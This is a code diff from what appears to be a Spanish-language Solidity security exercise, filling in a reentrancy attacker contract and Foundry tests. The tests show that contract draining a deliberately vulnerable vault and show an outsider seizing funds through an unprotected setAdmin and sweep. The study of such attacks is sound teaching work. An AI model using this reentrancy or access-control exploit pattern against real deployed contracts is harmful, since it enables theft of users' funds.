@@ -30,12 +30,18 @@ contract ReentrancyAttacker {
     // Ojo: para poder parar a tiempo en receive(), tal vez te sirva 
     // guardarte cuánto le estás sacando al vault en cada reentrada.
     function attack() external payable {
+        vault.deposit{value: 1 ether}(); //Deposito uno para poder hacer withdraw, porque sino cuando withdraw chequea balances[msg.sender] != 0 falla porque los mappings en Solidity retornan cero para toda entrada no registrada
+        vault.withdraw();
     }
 
     // TODO: se ejecuta cada vez que el vault le envia ETH.
     // Ojo con cuando parar: si la ultima llamada al vault revierte, el revert se
     // propaga hacia arriba y deshace todo el ataque.
     receive() external payable {
+        uint256 saldo_del_contrato = address(vault).balance;  //Casteo el contrato a address, así le puedo consultar su balance, que es la plata que tiene el contrato
+        if (saldo_del_contrato >= 1 ether){
+            vault.withdraw();
+        }
     }
 }
 
@@ -64,7 +70,22 @@ contract VaultVulnerableReentrancyTest is Test {
     // cuanto tiene el atacante, y que el libro contable (`balanceOf`) sigue
     // diciendo que las victimas tienen su saldo.
     function test_Reentrancy_DrenaElVault() public {
-        vm.skip(true);   // borrar cuando lo escribas
+        //vm.skip(true);   // borrar cuando lo escribas
+        //address deployer = makeAddr("deployer");
+        //ReentrancyAttacker attacker = new ReentrancyAttacker(vault);
+        //assertEq(address(vault).balance, 10 ether);
+        //attacker.attack{value: 1 ether}();
+        //assertEq(address(vault).balance, 0 ether);
+        //assertEq(address(attacker).balance, 11 ether);
+
+        assertEq(address(vault).balance, 10 ether);
+        ReentrancyAttacker attacker = new ReentrancyAttacker(vault);
+        vm.deal(attackerOwner, 1 ether);
+        vm.prank(attackerOwner);
+        attacker.attack{value: 1 ether}(); // invierte 1 ETH
+        assertEq(address(vault).balance, 0); // vault vacío
+        assertEq(address(attacker).balance, 11 ether); // 1 propio + 10 robados        
+
     }
 }
 
@@ -89,7 +110,15 @@ contract VaultVulnerableAccessControlTest is Test {
     // los 8 ETH de la victima. Sin contrato atacante: alcanza con llamadas
     // desde su cuenta (`vm.prank`).
     function test_AccessControl_ExtranioSeQuedaConLosFondos() public {
-        vm.skip(true);   // borrar cuando lo escribas
+        //vm.skip(true);   // borrar cuando lo escribas
+        assertEq(address(vault).balance, 8 ether);
+        assertEq(atacante.balance, 0 ether);
+        vm.prank(atacante);
+        vault.setAdmin(atacante);
+        vm.prank(atacante);
+        vault.sweep();
+        assertEq(address(vault).balance, 0 ether);
+        assertEq(atacante.balance, 8 ether);
     }
 }
 
